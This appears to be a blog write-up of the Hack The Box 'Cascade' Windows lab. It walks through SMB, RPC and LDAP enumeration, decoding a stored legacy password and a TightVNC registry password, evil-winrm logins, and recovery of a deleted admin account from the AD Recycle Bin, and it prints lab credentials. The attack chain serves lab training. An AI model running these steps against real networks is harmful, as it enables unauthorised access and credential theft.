---
title:     "Hack The Box - Cascade"
tags: [windows,medium,dnspy,AD,ldap,rpc,vnc]
categories: HackTheBox
---

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-cascade/Untitled.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-cascade/Untitled.png)

Cascade is a Windows Medium box, which involves lot of enumeration and finding VNC credentials which can be decrypted and with that we need to find SQlite database and also a small Reverse Engineering. Really a fun box to try.

Link: [https://www.hackthebox.eu/home/machines/profile/235](https://www.hackthebox.eu/home/machines/profile/235)

Let's Begin with our Initial Nmap Scan.

## Nmap Scan Results

```nix
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-06-01 06:23:18Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49165/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 Professional or Windows 8 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (91%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (91%), Microsoft Windows Vista SP2 (91%), Microsoft Windows Vista SP2, Windows 7 SP1, or Windows Server 2008 (90%), Microsoft Windows 8.1 Update 1 (90%), Microsoft Windows Phone 7.5 or 8.0 (90%), Microsoft Windows 7 or Windows Server 2008 R2 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 4m03s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2020-06-01T06:24:23
|_  start_date: 2020-06-01T06:02:40
```

## SMB Enumeration

Started with SMB and logged in without password and nothing here.

```nix
root@kali:~# smbclient -L 10.10.10.182
Enter WORKGROUP\root's password: 
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
SMB1 disabled -- no workgroup available
```

## RPC Enumeration

Connected to it without any password.

I can get a list of users with `enumdomusers`

```nix
root@kali:~#  rpcclient -U "" 10.10.10.182
Enter WORKGROUP\'s password: 
rpcclient $> enumdomusers
user:[CascGuest] rid:[0x1f5]
user:[arksvc] rid:[0x452]
user:[s.smith] rid:[0x453]
user:[r.thompson] rid:[0x455]
user:[util] rid:[0x457]
user:[j.wakefield] rid:[0x45c]
user:[s.hickson] rid:[0x461]
user:[j.goodhand] rid:[0x462]
user:[a.turnbull] rid:[0x464]
user:[e.crowe] rid:[0x467]
user:[b.hanson] rid:[0x468]
user:[d.burman] rid:[0x469]
user:[BackupSvc] rid:[0x46a]
user:[j.allen] rid:[0x46e]
user:[i.croft] rid:[0x46f]
```

## LDAP Enumeration

First I save the ldap result in a file. And looking at that shows a new thing called `cascadeLegacyPwd`, So I just checked if there is any other Pwd and its the only one.

```nix
root@kali:~/CTF/HTB/Boxes/Cascade# ldapsearch -h 10.10.10.182 -x -b "DC=cascade,DC=local" '(objectclass=Person)' > ldapresult
root@kali:~/CTF/HTB/Boxes/Cascade# cat ldapresult | grep Pwd
badPwdCount: 0
badPwdCount: 0
badPwdCount: 0
badPwdCount: 0
badPwdCount: 0
cascadeLegacyPwd: clk0bjVldmE=
badPwdCount: 0
badPwdCount: 0
badPwdCount: 0
badPwdCount: 0
badPwdCount: 0
badPwdCount: 0
badPwdCount: 0
badPwdCount: 0
badPwdCount: 0
badPwdCount: 0
badPwdCount: 0
```

So its for user `r.thompson` and it is base 64 encoded

```nix
root@kali:~/CTF/HTB/Boxes/Cascade# cat ldapresult | grep -B 25 cascadeLegacyPwd:
name: Ryan Thompson
objectGUID:: LfpD6qngUkupEy9bFXBBjA==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 132247339091081169
lastLogoff: 0
lastLogon: 132247339125713230
pwdLastSet: 132230718862636251
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAMvuhxgsd8Uf1yHJFVQQAAA==
accountExpires: 9223372036854775807
logonCount: 2
sAMAccountName: r.thompson
sAMAccountType: 805306368
userPrincipalName: r.thompson@cascade.local
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local
dSCorePropagationData: 20200126183918.0Z
dSCorePropagationData: 20200119174753.0Z
dSCorePropagationData: 20200119174719.0Z
dSCorePropagationData: 20200119174508.0Z
dSCorePropagationData: 16010101000000.0Z
lastLogonTimestamp: 132294360317419816
msDS-SupportedEncryptionTypes: 0
cascadeLegacyPwd: clk0bjVldmE=
```

This might be the users password

```nix
root@kali:~/CTF/HTB/Boxes/Cascade# echo -n clk0bjVldmE= | base64 -d
rY4n5eva
```

So back to SMB, I tried login with `r.thompson : rY4n5eva` and I switched on the recursive mode and list all the files.

```nix
root@kali:~/CTF/HTB/Boxes/Cascade# smbclient -L 10.10.10.182 -U 'r.thompson'
Enter WORKGROUP\r.thompson's password: 

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	Audit$          Disk      
	C$              Disk      Default share
	Data            Disk      
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	print$          Disk      Printer Drivers
	SYSVOL          Disk      Logon server share 
SMB1 disabled -- no workgroup available
root@kali:~/CTF/HTB/Boxes/Cascade# smbclient //10.10.10.182/Data -U 'r.thompson'
Enter WORKGROUP\r.thompson's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Jan 27 08:57:34 2020
  ..                                  D        0  Mon Jan 27 08:57:34 2020
  Contractors                         D        0  Mon Jan 13 07:15:11 2020
  Finance                             D        0  Mon Jan 13 07:15:06 2020
  IT                                  D        0  Tue Jan 28 23:34:51 2020
  Production                          D        0  Mon Jan 13 07:15:18 2020
  Temps                               D        0  Mon Jan 13 07:15:15 2020

		13106687 blocks of size 4096. 7793839 blocks available
smb: \> recurse on
smb: \> ls
  .                                   D        0  Mon Jan 27 08:57:34 2020
  ..                                  D        0  Mon Jan 27 08:57:34 2020
  Contractors                         D        0  Mon Jan 13 07:15:11 2020
  Finance                             D        0  Mon Jan 13 07:15:06 2020
  IT                                  D        0  Tue Jan 28 23:34:51 2020
  Production                          D        0  Mon Jan 13 07:15:18 2020
  Temps                               D        0  Mon Jan 13 07:15:15 2020

\Contractors
NT_STATUS_ACCESS_DENIED listing \Contractors\*

\Finance
NT_STATUS_ACCESS_DENIED listing \Finance\*

\IT
  .                                   D        0  Tue Jan 28 23:34:51 2020
  ..                                  D        0  Tue Jan 28 23:34:51 2020
  Email Archives                      D        0  Tue Jan 28 23:30:30 2020
  LogonAudit                          D        0  Tue Jan 28 23:34:40 2020
  Logs                                D        0  Wed Jan 29 06:23:04 2020
  Temp                                D        0  Wed Jan 29 03:36:59 2020

\Production
NT_STATUS_ACCESS_DENIED listing \Production\*

\Temps
NT_STATUS_ACCESS_DENIED listing \Temps\*

\IT\Email Archives
  .                                   D        0  Tue Jan 28 23:30:30 2020
  ..                                  D        0  Tue Jan 28 23:30:30 2020
  Meeting_Notes_June_2018.html        A     2522  Tue Jan 28 23:30:12 2020

\IT\LogonAudit
  .                                   D        0  Tue Jan 28 23:34:40 2020
  ..                                  D        0  Tue Jan 28 23:34:40 2020

\IT\Logs
  .                                   D        0  Wed Jan 29 06:23:04 2020
  ..                                  D        0  Wed Jan 29 06:23:04 2020
  Ark AD Recycle Bin                  D        0  Fri Jan 10 22:03:45 2020
  DCs                                 D        0  Wed Jan 29 06:26:00 2020

\IT\Temp
  .                                   D        0  Wed Jan 29 03:36:59 2020
  ..                                  D        0  Wed Jan 29 03:36:59 2020
  r.thompson                          D        0  Wed Jan 29 03:36:53 2020
  s.smith                             D        0  Wed Jan 29 01:30:01 2020

\IT\Logs\Ark AD Recycle Bin
  .                                   D        0  Fri Jan 10 22:03:45 2020
  ..                                  D        0  Fri Jan 10 22:03:45 2020
  ArkAdRecycleBin.log                 A     1303  Wed Jan 29 06:49:11 2020

\IT\Logs\DCs
  .                                   D        0  Wed Jan 29 06:26:00 2020
  ..                                  D        0  Wed Jan 29 06:26:00 2020
  dcdiag.log                          A     5967  Fri Jan 10 21:47:30 2020

\IT\Temp\r.thompson
  .                                   D        0  Wed Jan 29 03:36:53 2020
  ..                                  D        0  Wed Jan 29 03:36:53 2020

\IT\Temp\s.smith
  .                                   D        0  Wed Jan 29 01:30:01 2020
  ..                                  D        0  Wed Jan 29 01:30:01 2020
  VNC Install.reg                     A     2680  Wed Jan 29 00:57:44 2020
smb: \>
```

Some files seems interesting so downloaded them to my machine for further examine.

`Meeting_Notes_June_2018.html`

```html
<p>-- New production network will be going live on
Wednesday so keep an eye out for any issues. </p>

<p>-- We will be using a temporary account to
perform all tasks related to the network migration and this account will be deleted at the end of
2018 once the migration is complete. This will allow us to identify actions
related to the migration in security logs etc. Username is TempAdmin (password is the same as the normal admin account password). </p>

<p>-- The winner of the �Best GPO� competition will be
announced on Friday so get your submissions in soon.</p>

<p class=MsoNormal><o:p>&nbsp;</o:p></p>
```

There is a thing to note here they use a `TempAdmin` to do some network migration and the password is as same for Admin account.

## Getting User Shell

There is an interesting file in `s.smith` which is `VNC Install.reg`

```nix
root@kali:~/CTF/HTB/Boxes/Cascade# cat VNC\ Install.reg
��Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC]

[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC\Server]
"ExtraPorts"=""
"QueryTimeout"=dword:0000001e
"QueryAcceptOnTimeout"=dword:00000000
"LocalInputPriorityTimeout"=dword:00000003
"LocalInputPriority"=dword:00000000
"BlockRemoteInput"=dword:00000000
"BlockLocalInput"=dword:00000000
"IpAccessControl"=""
"RfbPort"=dword:0000170c
"HttpPort"=dword:000016a8
"DisconnectAction"=dword:00000000
"AcceptRfbConnections"=dword:00000001
"UseVncAuthentication"=dword:00000001
"UseControlAuthentication"=dword:00000000
"RepeatControlAuthentication"=dword:00000000
"LoopbackOnly"=dword:00000000
"AcceptHttpConnections"=dword:00000001
"LogLevel"=dword:00000000
"EnableFileTransfers"=dword:00000001
"RemoveWallpaper"=dword:00000001
"UseD3D"=dword:00000001
"UseMirrorDriver"=dword:00000001
"EnableUrlParams"=dword:00000001
"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
"AlwaysShared"=dword:00000000
"NeverShared"=dword:00000000
"DisconnectClients"=dword:00000001
"PollingInterval"=dword:000003e8
"AllowLoopback"=dword:00000000
"VideoRecognitionInterval"=dword:00000bb8
"GrabTransparentWindows"=dword:00000001
"SaveLogToAllUsersPath"=dword:00000000
"VideoClasses"=""
```

It contains encrypted password and I googled how to crack it and found this post

[https://github.com/frizb/PasswordDecrypts](https://github.com/frizb/PasswordDecrypts)

I used the hex we found inside the decrypt and It gives us the password.

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-cascade/Untitled%201.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-cascade/Untitled%201.png)

I tried login evil-winrm with the credentials `s.smith : sT333ve2`

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-cascade/Untitled%202.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-cascade/Untitled%202.png)

After some enumeration I decided to check SMB again with the new user

```nix
root@kali:~/CTF/HTB/Boxes/Cascade# smbclient -L 10.10.10.182 -U 's.smith'
Enter WORKGROUP\s.smith's password: 

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	Audit$          Disk      
	C$              Disk      Default share
	Data            Disk      
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	print$          Disk      Printer Drivers
	SYSVOL          Disk      Logon server share 
SMB1 disabled -- no workgroup available
root@kali:~/CTF/HTB/Boxes/Cascade# smbclient //10.10.10.182/Audit$ -U 's.smith'
Enter WORKGROUP\s.smith's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jan 29 23:31:26 2020
  ..                                  D        0  Wed Jan 29 23:31:26 2020
  CascAudit.exe                       A    13312  Wed Jan 29 03:16:51 2020
  CascCrypto.dll                      A    12288  Wed Jan 29 23:30:20 2020
  DB                                  D        0  Wed Jan 29 03:10:59 2020
  RunAudit.bat                        A       45  Wed Jan 29 04:59:47 2020
  System.Data.SQLite.dll              A   363520  Sun Oct 27 12:08:36 2019
  System.Data.SQLite.EF6.dll          A   186880  Sun Oct 27 12:08:38 2019
  x64                                 D        0  Mon Jan 27 03:55:27 2020
  x86                                 D        0  Mon Jan 27 03:55:27 2020

		13106687 blocks of size 4096. 7793037 blocks available
smb: \> cd DB
smb: \DB\> ls
  .                                   D        0  Wed Jan 29 03:10:59 2020
  ..                                  D        0  Wed Jan 29 03:10:59 2020
  Audit.db                            A    24576  Wed Jan 29 03:09:24 2020

		13106687 blocks of size 4096. 7793295 blocks available
smb: \DB\> get Audit.db 
getting file \DB\Audit.db of size 24576 as Audit.db (20.3 KiloBytes/sec) (average 20.3 KiloBytes/sec)
smb: \DB\>
```

There is a database file downloaded to my machine.

I Dump them all

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-cascade/Untitled%203.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-cascade/Untitled%203.png)

There is an user `ArkSvc` and a encrypted password and its not Base64. So our next choice is RE `CascAudit.exe`

I tried login with evil-winrm with new credentials we found `ArkSvc : w3lc0meFr31nd`

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-cascade/Untitled%204.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-cascade/Untitled%204.png)

## Privilege Escalation

Checking about user `arksvc`, shows he is the group of `AD Recycle Bin`

```c
*Evil-WinRM* PS C:\> net user arksvc
User name                    arksvc
Full Name                    ArkSvc
Comment
User's comment
Country code                 000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/9/2020 5:18:20 PM
Password expires             Never
Password changeable          1/9/2020 5:18:20 PM
Password required            Yes
User may change password     No

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   3/30/2020 12:37:25 PM

Logon hours allowed          All

Local Group Memberships      *AD Recycle Bin       *IT
                             *Remote Management Use
Global Group memberships     *Domain Users
The command completed successfully.
```

> The Active Directory Recycle Bin was introduced in the Windows Server 2008 R2 release. The goal of this feature was to facilitate the recovery of deleted Active Directory objects without requiring restoration of backups, restarting Active Directory Domain Services, or rebooting domain controllers.

After some googling, Since we are in `AD Recycle Bin` group, I found this command and it retrieve the deleted stuffs.

```powershell
*Evil-WinRM* PS C:\Users\arksvc\Documents> Get-ADObject -filter 'isdeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects -property *
.
.
.
.
.
.
Name                            : User
                                  DEL:746385f2-e3a0-4252-b83a-5a206da0ed88
nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                  :
ObjectClass                     : container
ObjectGUID                      : 746385f2-e3a0-4252-b83a-5a206da0ed88
ProtectedFromAccidentalDeletion : False
sDRightsEffective               : 0
showInAdvancedViewOnly          : True
uSNChanged                      : 196700
uSNCreated                      : 196690
whenChanged                     : 1/26/2020 2:40:52 AM
whenCreated                     : 1/26/2020 2:34:31 AM

accountExpires                  : 9223372036854775807
badPasswordTime                 : 0
badPwdCount                     : 0
CanonicalName                   : cascade.local/Deleted Objects/TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz
CN                              : TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
codePage                        : 0
countryCode                     : 0
Created                         : 1/27/2020 3:23:08 AM
createTimeStamp                 : 1/27/2020 3:23:08 AM
Deleted                         : True
Description                     :
```

Here we get `TempAdmin` password we know both Admin and `TempAdmin` password is same.

We know its base64 encrypted so encoding it gives me that password.

```nix
root@kali:~/CTF/HTB/Boxes/Cascade# echo -n YmFDVDNyMWFOMDBkbGVz | base64 -d
baCT3r1aN00dles
```

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-cascade/Untitled%205.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-cascade/Untitled%205.png)

We own the System